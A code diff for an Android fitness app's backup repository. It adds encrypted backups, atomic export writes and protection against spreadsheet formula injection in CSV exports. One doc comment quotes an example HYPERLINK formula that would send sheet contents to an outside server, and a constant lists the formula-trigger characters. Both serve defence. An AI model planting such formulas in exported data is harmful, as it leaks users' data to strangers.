@@ -7,6 +7,7 @@ import androidx.datastore.preferences.core.PreferenceDataStoreFactory
 import androidx.datastore.preferences.core.edit
 import androidx.documentfile.provider.DocumentFile
 import com.forge.app.RestoreManifest
+import com.forge.app.core.crypto.BackupCrypto
 import com.forge.app.core.io.exportFile
 import com.forge.app.core.time.mondayStartMs
 import com.forge.app.data.db.ForgeDatabase
@@ -19,6 +20,7 @@ import com.forge.app.data.prefs.PreferenceKeys
 import com.forge.app.data.prefs.SettingsRepository
 import com.forge.app.domain.cardio.CardioActivity
 import com.forge.app.domain.cardio.CardioCondition
+import com.forge.app.security.BackupEncryption
 import dagger.hilt.android.qualifiers.ApplicationContext
 import org.json.JSONArray
 import org.json.JSONObject
@@ -54,7 +56,8 @@ class BackupRepository @Inject constructor(
     private val avatarRepo: AvatarRepository,
     private val grants: PersistedTreeGrants,
     private val db: ForgeDatabase,
-    private val clock: com.forge.app.core.time.Clock
+    private val clock: com.forge.app.core.time.Clock,
+    private val encryption: BackupEncryption
 ) {
 
     /**
@@ -69,7 +72,17 @@ class BackupRepository @Inject constructor(
     private val dateFmt = DateTimeFormatter.ofPattern("yyyy-MM-dd")
 
     /** The outcome of a restore attempt — distinct reasons so the UI can explain a failure (E6). */
-    enum class RestoreOutcome { SUCCESS, NOT_A_BACKUP, NEWER_VERSION, TOO_OLD, CORRUPT, TOO_LARGE, IO_ERROR, NO_BACKUP_FILE }
+    enum class RestoreOutcome {
+        SUCCESS, NOT_A_BACKUP, NEWER_VERSION, TOO_OLD, CORRUPT, TOO_LARGE, IO_ERROR, NO_BACKUP_FILE,
+        /** The backup is password-protected and this phone has no key for it: ask, then retry. */
+        NEEDS_PASSWORD,
+        /** The password given does not open this backup. */
+        WRONG_PASSWORD
+    }
+
+    /** A backup password is set but its key is unreadable; see [BackupEncryption.State.Unavailable]. */
+    class BackupPasswordUnavailableException :
+        java.io.IOException("Your backup password needs to be set again in Settings")
 
     /** Stream one of the shared field maps (`exportSessionFields` and friends) into [JsonWriter]. */
     private fun JsonWriter.fields(fields: Map<String, Any>) {
@@ -184,9 +197,7 @@ class BackupRepository @Inject constructor(
         }
 
         // Fixed filename (overwrite) so repeated exports don't accumulate forever (#84).
-        val file = exportFile(context, "avex_weekly_export.json")
-        file.writeText(root.toString(2))
-        file
+        publishExport("avex_weekly_export.json", root.toString(2))
     }
 
     /**
@@ -228,7 +239,9 @@ class BackupRepository @Inject constructor(
             // read as a complete one.
             val target = exportFile(context, "avex_export.json")
             val scratch = File(target.parentFile, target.name + ".part")
-            scratch.bufferedWriter().use { out ->
+            // A cancelled or failed write must not leave a partial dump of the whole history in
+            // exports/, where nothing would ever clean it up.
+            scratch.deleteOnFailure { scratch.bufferedWriter().use { out ->
                 JsonWriter(out).use { w ->
                     w.setIndent("  ")
                     w.beginObject()
@@ -311,7 +324,7 @@ class BackupRepository @Inject constructor(
                     w.endArray()
                     w.endObject()
                 }
-            }
+            } }
             // Published by the rename, so a cancelled or failed export leaves the previous file
             // rather than a truncated one under the name the user shares.
             if (!scratch.renameTo(target)) {
@@ -355,16 +368,52 @@ class BackupRepository @Inject constructor(
         }
         // Session-id in the filename so saving several sessions doesn't overwrite one another (and a
         // re-export of the same session overwrites its own file rather than accumulating).
-        val file = exportFile(context, "avex_session_${s.id}.json")
-        file.writeText(root.toString(2))
-        file
+        publishExport("avex_session_${s.id}.json", root.toString(2))
     }
 
-    /** RFC 4180 CSV field: quote and double embedded quotes when the value holds a comma/quote/newline. */
-    private fun csv(value: String): String =
-        if (value.any { it == ',' || it == '"' || it == '\n' || it == '\r' })
-            "\"" + value.replace("\"", "\"\"") + "\""
-        else value
+    /**
+     * RFC 4180 CSV field: quote and double embedded quotes when the value holds a comma/quote/newline.
+     *
+     * Also neutralises spreadsheet formulas (CWE-1236). Every text column here can hold something
+     * the user did not type: an exercise name kept verbatim from a Strong or Hevy import, a day key
+     * from an imported Avex JSON. A cell starting with `=`, `+`, `-`, `@`, tab or CR is evaluated by
+     * Excel, Sheets and LibreOffice when the file is opened, so `=HYPERLINK("http://…?"&A1,"Bench")`
+     * would read the sheet out to a stranger's server. Such a cell gets a leading apostrophe, the
+     * OWASP-recommended escape, which every spreadsheet shows as plain text. Numeric columns are not
+     * written through here, so a negative number is unaffected.
+     */
+    private fun csv(value: String): String {
+        val formula = value.firstOrNull() in FORMULA_TRIGGERS
+        val safe = if (formula) "'$value" else value
+        return if (formula || safe.any { it == ',' || it == '"' || it == '\n' || it == '\r' })
+            "\"" + safe.replace("\"", "\"\"") + "\""
+        else safe
+    }
+
+    /** Run [block], deleting this scratch file if it throws (cancellation included). */
+    private inline fun <T> File.deleteOnFailure(block: () -> T): T =
+        try { block() } catch (e: Throwable) { delete(); throw e }
+
+    /**
+     * Write an export under [name] by writing a scratch file and renaming it in.
+     *
+     * `writeText` truncates the target first, so a second tap on the same export, or a crash or full
+     * disk mid-write, left a half file under the name a share receiver may still be reading. The
+     * rename is atomic within the directory, so a reader sees the old file or the new one, never a
+     * prefix. The scratch never outlives a failure.
+     */
+    private fun publishExport(name: String, text: String): File {
+        val target = exportFile(context, name)
+        val scratch = File(target.parentFile, "$name.part")
+        scratch.deleteOnFailure {
+            scratch.writeText(text)
+            if (!scratch.renameTo(target)) {
+                target.delete()
+                if (!scratch.renameTo(target)) error("Could not publish $name")
+            }
+        }
+        return target
+    }
 
     /** Export as CSV — sessions summary (#138). */
     suspend fun exportSessionsCsv(): File = withContext(Dispatchers.IO) {
@@ -379,9 +428,7 @@ class BackupRepository @Inject constructor(
             sb.appendLine("${s.id},${csv(s.dayKey)},$date,$dur,${s.totalVolumeLb ?: 0},${s.prCount},${s.setCount},${csv(s.intensity)},${csv(s.tags)}")
         }
         // Fixed filename (overwrite) — see #84.
-        val file = exportFile(context, "avex_sessions.csv")
-        file.writeText(sb.toString())
-        file
+        publishExport("avex_sessions.csv", sb.toString())
     }
 
     /**
@@ -399,9 +446,7 @@ class BackupRepository @Inject constructor(
             val date = dateFmt.format(Instant.ofEpochMilli(pr.sessionDate).atZone(zone))
             sb.appendLine("${csv(pr.exerciseName)},${csv(pr.muscle.displayName)},${pr.maxWeightLb},${pr.bestReps},$date")
         }
-        val file = exportFile(context, "avex_prs.csv")
-        file.writeText(sb.toString())
-        file
+        publishExport("avex_prs.csv", sb.toString())
     }
 
     /** Every bodyweight weigh-in as CSV (Cat 11). One row per entry, newest first. */
@@ -410,9 +455,7 @@ class BackupRepository @Inject constructor(
         val sb = StringBuilder()
         sb.appendLine("date,weightLb")
         entries.forEach { e -> sb.appendLine("${e.dateKey},${e.weightLb}") }
-        val file = exportFile(context, "avex_bodyweight.csv")
-        file.writeText(sb.toString())
-        file
+        publishExport("avex_bodyweight.csv", sb.toString())
     }
 
     /**
@@ -438,9 +481,7 @@ class BackupRepository @Inject constructor(
                     csv(conditions)
             )
         }
-        val file = exportFile(context, "avex_cardio.csv")
-        file.writeText(sb.toString())
-        file
+        publishExport("avex_cardio.csv", sb.toString())
     }
 
     /** Total on-disk database size (main file + WAL + SHM), in bytes — the Data dialog readout. */
@@ -458,7 +499,10 @@ class BackupRepository @Inject constructor(
     suspend fun autoBackup(folderUri: Uri? = null): File = withContext(Dispatchers.IO) {
         val file = File(context.filesDir, AUTO_BACKUP_NAME)
         val tmp = File(context.filesDir, AUTO_BACKUP_TMP_NAME)
-        val snap = snapshotDatabase()
+        // Resolved before the snapshot: with a password set but its key unreadable, this throws
+        // rather than writing the weekly copy unencrypted behind the user's back.
+        val key = backupKeyOrNull()
+        val snap = try { snapshotDatabase() } catch (e: Throwable) { key?.wipe(); throw e }
         try {
             // Write to a temp file and rename over the slot, rather than truncating the slot and
             // writing into it. `File.outputStream()` truncates on open, so the old behaviour
@@ -469,7 +513,7 @@ class BackupRepository @Inject constructor(
             // backup that could not be restored. rename(2) within a directory is atomic, so the
             // slot now only ever holds a complete zip.
             tmp.delete()
-            tmp.outputStream().use { out -> writeBackupZip(out, snap) }
+            tmp.outputStream().use { out -> writeBackupZip(out, snap, key) }
             // A factory reset is running (or was interrupted and will finish at boot). This backup
             // snapshotted the data the user just asked to erase, and landing it in the slot would
             // bring a copy of it back after [deleteLocalCopies] ran (2026-09-26 audit, D2). The
@@ -490,10 +534,11 @@ class BackupRepository @Inject constructor(
             }
             // Also mirror into a user-picked folder so the backup survives an uninstall (GYMAP-67). A
             // folder write must not fail the whole backup — the internal copy already succeeded.
-            if (folderUri != null) runCatching { writeZipToFolder(folderUri, snap) }
+            if (folderUri != null) runCatching { writeZipToFolder(folderUri, snap, key) }
         } finally {
             tmp.delete()
             snap.delete()
+            key?.wipe()
         }
         // Drop the stale lossy JSON slot from earlier builds so it can't mislead a future restore.
         File(context.filesDir, LEGACY_AUTO_BACKUP_JSON).delete()
@@ -503,7 +548,7 @@ class BackupRepository @Inject constructor(
     }
 
     /** Write the full backup zip into a user-granted SAF tree, overwriting the prior slot (GYMAP-67). */
-    private fun writeZipToFolder(folderUri: Uri, snap: File) {
+    private fun writeZipToFolder(folderUri: Uri, snap: File, key: BackupCrypto.MasterKey?) {
         val tree = DocumentFile.fromTreeUri(context, folderUri) ?: return
         // Write the replacement under a temp name FIRST, then retire the old one. Deleting the
         // previous backup before creating its replacement (the old order) meant any failure below
@@ -515,7 +560,7 @@ class BackupRepository @Inject constructor(
         val tmp = tree.createFile("application/zip", FOLDER_TMP_NAME) ?: return
         val wrote = runCatching {
             val out = context.contentResolver.openOutputStream(tmp.uri) ?: return@runCatching false
-            out.use { writeBackupZip(it, snap) }
+            out.use { writeBackupZip(it, snap, key) }
             true
         }.getOrDefault(false)
         if (!wrote) { tmp.delete(); return }
@@ -599,6 +644,9 @@ class BackupRepository @Inject constructor(
         clearPendingRestore()
         runCatching { File(context.filesDir, com.forge.app.core.io.EXPORTS_DIR).deleteRecursively() }
         runCatching { File(context.filesDir, CRASH_LOG_DIR).deleteRecursively() }
+        // The backup password is a setting like any other, and the reset clears settings. Backups
+        // already saved outside the app keep needing it, which is what the reset dialog promises.
+        runCatching { encryption.clear() }
         runCatching {
             context.cacheDir.listFiles()?.forEach { f ->
                 if (TEMP_PREFIXES.any { f.name.startsWith(it) }) f.deleteRecursively()
@@ -686,13 +734,15 @@ class BackupRepository @Inject constructor(
      * preferences file, so a restore brings settings back too (#14).
      */
     suspend fun backupToUri(uri: Uri) = withContext(Dispatchers.IO) {
-        val snap = snapshotDatabase()
+        val key = backupKeyOrNull()
+        val snap = try { snapshotDatabase() } catch (e: Throwable) { key?.wipe(); throw e }
         try {
             context.contentResolver.openOutputStream(uri)?.use { out ->
-                writeBackupZip(out, snap)
+                writeBackupZip(out, snap, key)
             } ?: error("Could not open the chosen destination")
         } finally {
             snap.delete()
+            key?.wipe()
         }
         // Only reached on success: a fresh manual backup clears any stale "auto-backup failed" notice
         // (the user now has a recent backup, which is exactly what that warning asks them to make).
@@ -713,9 +763,13 @@ class BackupRepository @Inject constructor(
      * Writes the backup archive to [out]: the DB snapshot, the DataStore prefs (if present), and
      * every progress-photo file (under [PHOTOS_PREFIX]). Shared by [backupToUri] and [autoBackup]
      * so the two formats can never drift. The ZipOutputStream's use{} closes [out].
+     *
+     * With a [key], the ZIP is sealed into the encrypted container ([BackupCrypto]) as it is
+     * written, so no plaintext copy of the archive ever touches the destination.
      */
-    private fun writeBackupZip(out: java.io.OutputStream, snap: File) {
-        java.util.zip.ZipOutputStream(out).use { zip ->
+    private fun writeBackupZip(out: java.io.OutputStream, snap: File, key: BackupCrypto.MasterKey?) {
+        val sink = key?.let { BackupCrypto.encryptingStream(out, it) } ?: out
+        java.util.zip.ZipOutputStream(sink).use { zip ->
             zip.putNextEntry(java.util.zip.ZipEntry(ZIP_DB_ENTRY))
             snap.inputStream().use { it.copyTo(zip) }
             zip.closeEntry()
@@ -753,6 +807,51 @@ class BackupRepository @Inject constructor(
     }
 
     /**
+     * The key new backups are sealed with, or null for a plain ZIP. The caller wipes it when done.
+     * Throws when a password is set but its key cannot be read: a backup the user asked to have
+     * protected must fail visibly rather than go out in the clear.
+     */
+    private fun backupKeyOrNull(): BackupCrypto.MasterKey? = when (val s = encryption.state()) {
+        BackupEncryption.State.Off -> null
+        is BackupEncryption.State.On -> s.key
+        BackupEncryption.State.Unavailable -> throw BackupPasswordUnavailableException()
+    }
+
+    /**
+     * Decrypt a password-protected backup in [sealed] into [plain].
+     *
+     * This phone's own key is tried first when the file was made under it (the weekly slot, or a
+     * backup saved from here), so restoring on the same phone needs no typing. Otherwise the key is
+     * re-derived from [password], or [RestoreOutcome.NEEDS_PASSWORD] asks the caller for one.
+     * Returns SUCCESS when [plain] holds the whole, authenticated archive.
+     */
+    private fun decryptBackup(sealed: File, plain: File, password: CharArray?): RestoreOutcome {
+        sealed.inputStream().buffered().use { input ->
+            val header = BackupCrypto.readHeader(input) ?: return RestoreOutcome.CORRUPT
+            val own = (encryption.state() as? BackupEncryption.State.On)?.key
+            val key = when {
+                own != null && own.matches(header) -> own
+                password != null -> { own?.wipe(); BackupCrypto.masterKeyFor(header, password) }
+                else -> { own?.wipe(); return RestoreOutcome.NEEDS_PASSWORD }
+            }
+            try {
+                val result = plain.outputStream().use { out ->
+                    BackupCrypto.decrypt(header, key, input, out, MAX_RESTORE_BYTES)
+                }
+                return when (result) {
+                    BackupCrypto.DecryptResult.Ok -> RestoreOutcome.SUCCESS
+                    BackupCrypto.DecryptResult.WrongPassword ->
+                        if (password == null) RestoreOutcome.NEEDS_PASSWORD else RestoreOutcome.WRONG_PASSWORD
+                    BackupCrypto.DecryptResult.Corrupt -> RestoreOutcome.CORRUPT
+                    BackupCrypto.DecryptResult.TooLarge -> RestoreOutcome.TOO_LARGE
+                }
+            } finally {
+                key.wipe()
+            }
+        }
+    }
+
+    /**
      * Stream [input] into [dest], stopping once it exceeds [maxBytes] (E3).
      *
      * Returns the number of bytes written, or -1 when the cap was hit. The count is what lets the
@@ -778,7 +877,7 @@ class BackupRepository @Inject constructor(
      * first; only then stages the swap. Returns a [RestoreOutcome] — on SUCCESS the caller
      * MUST restart the app afterward (the file is swapped at next boot).
      */
-    suspend fun restoreFromUri(uri: Uri): RestoreOutcome = withContext(Dispatchers.IO) {
+    suspend fun restoreFromUri(uri: Uri, password: CharArray? = null): RestoreOutcome = withContext(Dispatchers.IO) {
         val incoming = File(context.cacheDir, "forge_restore_in_${System.currentTimeMillis()}")
         if (incoming.exists()) incoming.delete()
         val copied = try {
@@ -792,7 +891,7 @@ class BackupRepository @Inject constructor(
             return@withContext RestoreOutcome.IO_ERROR
         }
         if (!copied) { incoming.delete(); return@withContext RestoreOutcome.TOO_LARGE }
-        restoreFromIncoming(incoming)
+        restoreFromIncoming(incoming, password)
     }
 
     /**
@@ -800,7 +899,7 @@ class BackupRepository @Inject constructor(
      * file, so this is the in-app recovery path for the otherwise write-only auto-backup. Copies the
      * slot to a cache temp first so [restoreFromIncoming]'s cleanup never deletes the live slot itself.
      */
-    suspend fun restoreFromAutoBackup(): RestoreOutcome = withContext(Dispatchers.IO) {
+    suspend fun restoreFromAutoBackup(password: CharArray? = null): RestoreOutcome = withContext(Dispatchers.IO) {
         val auto = File(context.filesDir, AUTO_BACKUP_NAME)
         if (!auto.exists()) return@withContext RestoreOutcome.NO_BACKUP_FILE
         val incoming = File(context.cacheDir, "forge_restore_in_${System.currentTimeMillis()}")
@@ -813,7 +912,7 @@ class BackupRepository @Inject constructor(
             return@withContext RestoreOutcome.IO_ERROR
         }
         if (!copied) { incoming.delete(); return@withContext RestoreOutcome.TOO_LARGE }
-        restoreFromIncoming(incoming)
+        restoreFromIncoming(incoming, password)
     }
 
     /**
@@ -821,8 +920,11 @@ class BackupRepository @Inject constructor(
      * as pending files that [com.forge.app.ForgeApp.applyPendingRestore] swaps in atomically at next
      * boot — DB, prefs and photos together, so a kill or copy failure can never leave the live DB and
      * photo folder from different backups. Returns a [RestoreOutcome]. Deletes [incoming].
+     *
+     * A password-protected backup is decrypted first, into cache scratch that goes with the rest of
+     * [temps]; everything after that reads the decrypted archive exactly as it would a plain one.
      */
-    private suspend fun restoreFromIncoming(incoming: File): RestoreOutcome = withContext(Dispatchers.IO) {
+    private suspend fun restoreFromIncoming(incoming: File, password: CharArray?): RestoreOutcome = withContext(Dispatchers.IO) {
         sweepStaleTemps(keep = incoming)
         val temps = mutableListOf(incoming) // cache-dir temp files to clean up before returning
         // Set true only once EVERY staged component has landed. The finally below uses it to discard
@@ -831,11 +933,19 @@ class BackupRepository @Inject constructor(
         var photoStage: File? = null        // extracted progress photos, staged only after validation
         var avatarStage: File? = null       // extracted avatar temp (in temps), applied after validation
         try {
+            var source = incoming
+            if (BackupCrypto.isEncrypted(incoming)) {
+                val plain = File(context.cacheDir, "forge_restore_plain_${System.currentTimeMillis()}")
+                    .also { it.delete(); temps.add(it) }
+                val decrypted = decryptBackup(incoming, plain, password)
+                if (decrypted != RestoreOutcome.SUCCESS) return@withContext decrypted
+                source = plain
+            }
             // Sniff the format: a #14 backup is a ZIP { database.db, settings.preferences_pb };
             // a pre-#14 backup is the raw SQLite DB. Restore both.
-            var dbFile = incoming
+            var dbFile = source
             var prefsFile: File? = null
-            if (isZip(incoming)) {
+            if (isZip(source)) {
                 val exDb = File(context.cacheDir, "forge_restore_db_${System.currentTimeMillis()}.db")
                     .also { it.delete(); temps.add(it) }
                 var sawDb = false
@@ -848,7 +958,7 @@ class BackupRepository @Inject constructor(
                 // One budget for the WHOLE archive, on top of the per-entry caps below. See
                 // [ExtractionBudget] for why the per-entry cap alone bounds nothing that matters.
                 val budget = ExtractionBudget(MAX_RESTORE_TOTAL_BYTES, MAX_RESTORE_PHOTOS)
-                java.util.zip.ZipInputStream(incoming.inputStream()).use { zin ->
+                java.util.zip.ZipInputStream(source.inputStream()).use { zin ->
                     var entry = zin.nextEntry
                     while (entry != null && !oversized) {
                         val name = entry.name
@@ -1301,6 +1411,9 @@ class BackupRepository @Inject constructor(
         private const val MAX_RESTORE_PHOTOS = 5_000
 
         /** Cache scratch this class creates, all timestamp-named. Swept by [sweepStaleTemps]. */
+        /** First characters that make a spreadsheet evaluate a cell; see [csv]. */
+        private val FORMULA_TRIGGERS = setOf('=', '+', '-', '@', '\t', '\r')
+
         private val TEMP_PREFIXES = listOf("forge_snapshot_", "forge_restore_")
         /** Nothing this old can still belong to a running backup or restore. */
         private const val TEMP_STALE_MS = 6L * 60 * 60 * 1000 // 6 hours
